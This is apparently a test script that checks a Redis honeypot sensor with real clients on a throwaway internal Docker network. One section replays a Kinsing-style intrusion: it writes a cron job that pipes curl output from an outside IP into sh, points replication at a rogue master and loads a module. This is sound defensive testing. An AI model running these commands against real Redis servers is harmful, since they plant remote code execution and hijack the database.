#!/bin/sh
# Black-box check with real clients (valkey-cli, redis-py, nmap -sV) against the built container.
# Usage (repo root):  sg docker -c "sh sensors/redis/tests/blackbox.sh"
# Needs docker and network access to pull redis, python and instrumentisto/nmap. Everything runs
# on a private throwaway network with no published ports; a throwaway Redis (no auth) collects
# the events, which are summarised at the end. Nothing here touches the live stack.
set -eu
cd "$(dirname "$0")/../../.."
NET=sp-redis-bb; NAME=sp-redis-bb; IMG=sp-redis-bb:dev; STREAM=sp-redis-bb-stream
cleanup() {
  docker rm -f "$NAME" "$STREAM" sp-redis-bb-py >/dev/null 2>&1 || true
  docker network rm "$NET" >/dev/null 2>&1 || true
  docker volume rm "$NAME-data" >/dev/null 2>&1 || true
}
trap cleanup EXIT; cleanup
docker build -q -f sensors/redis/Dockerfile -t "$IMG" . >/dev/null
# --internal: no route out of the network, like the sensors-redis network in compose.
docker network create --internal "$NET" >/dev/null
docker run -d --name "$STREAM" --network "$NET" valkey/valkey:9.1-alpine3.24 >/dev/null
docker run -d --name "$NAME" --network "$NET" --read-only --tmpfs /tmp:rw,noexec,nosuid,size=16m \
  --cap-drop ALL --security-opt no-new-privileges:true --memory 256m --memory-swap 256m \
  --cpus 0.5 --pids-limit 128 -v "$NAME-data:/data" \
  -e REDIS_HOST="$STREAM" -e EVENTS_STREAM=events:redis "$IMG" >/dev/null
for _ in $(seq 1 30); do
  [ "$(docker inspect -f '{{.State.Health.Status}}' "$NAME")" = healthy ] && break
  sleep 2
done
[ "$(docker inspect -f '{{.State.Health.Status}}' "$NAME")" = healthy ] || { echo "not healthy"; exit 1; }
echo HEALTHY
CLI="docker run --rm --network $NET valkey/valkey:9.1-alpine3.24 valkey-cli -h $NAME"

echo "--- valkey-cli basics"
$CLI PING
$CLI INFO server | head -12
$CLI SET foo bar
$CLI --version

echo "--- kinsing/cron chain (one connection, as bots do)"
docker run --rm --network "$NET" valkey/valkey:9.1-alpine3.24 sh -c "valkey-cli -h $NAME <<'CMDS'
FLUSHALL
CONFIG SET dir /var/spool/cron/
CONFIG SET dbfilename root
SET x \"\\n*/1 * * * * curl -fsSL http://198.51.100.9/x.sh | sh\\n\"
SAVE
CONFIG GET dir
SLAVEOF 203.0.113.50 6379
MODULE LOAD /tmp/exp.so
EVAL \"return 1\" 0
CMDS"

echo "--- no egress from the sensor (these must all fail)"
docker exec "$NAME" python -c "
import socket
for host in ('1.1.1.1', '203.0.113.1'):
    try:
        socket.create_connection((host, 53), timeout=3)
        print('EGRESS OPEN to', host)
    except OSError as exc:
        print('blocked:', host, type(exc).__name__)
"

echo "--- redis-py (this client also joins the default bridge to pip install)"
docker create --name sp-redis-bb-py --network "$NET" python:3.15.2-slim-trixie sh -c "pip install -q redis 2>&1 | tail -1; python - <<'PY'
import redis
r = redis.Redis(host='$NAME')
print(r.ping(), r.set('a', 1), r.get('a'), r.info('server')['redis_version'], r.dbsize())
r3 = redis.Redis(host='$NAME', protocol=3)
print(r3.ping(), r3.config_get('dir'))
PY" >/dev/null
docker network connect bridge sp-redis-bb-py
docker start -a sp-redis-bb-py | grep -v WARNING || true
docker rm -f sp-redis-bb-py >/dev/null 2>&1 || true

echo "--- nmap -sV"
docker run --rm --network "$NET" instrumentisto/nmap -Pn -sV -p 6379 "$NAME" | sed -n '/^PORT/,/^Service detection/p'

echo "--- cross-protocol and garbage"
docker run --rm --network "$NET" alpine:3.24 sh -c "printf 'POST / HTTP/1.1\r\nHost: x\r\n\r\n' | nc -w 2 $NAME 6379 | od -c | head -2; echo post_done; printf 'GET / HTTP/1.0\r\n\r\n' | nc -w 2 $NAME 6379"
sleep 1
echo "--- events"
docker exec "$STREAM" valkey-cli XRANGE events:redis - + | grep '^{' | \
  sed -E 's/.*"type":"([a-z_]+)".*/\1/' | sort | uniq -c
docker exec "$STREAM" valkey-cli XRANGE events:redis - + | grep -o '"flags":\[[^]]*\]' | sort | uniq -c | sort -rn | head -20
docker exec "$STREAM" valkey-cli XRANGE events:redis - + | grep '"download_attempt"' | cut -c1-400
docker exec "$STREAM" valkey-cli XRANGE events:redis - + | grep '"redis_replication"' | cut -c1-400
docker exec "$STREAM" valkey-cli XRANGE events:redis - + | grep '"config_changes"' | tail -1 | cut -c1-600
docker logs "$NAME" 2>&1 | grep -ci "honeypot\|suckerpot\|traceback" | sed 's/^/giveaway_or_traceback_lines_in_logs=/' || true
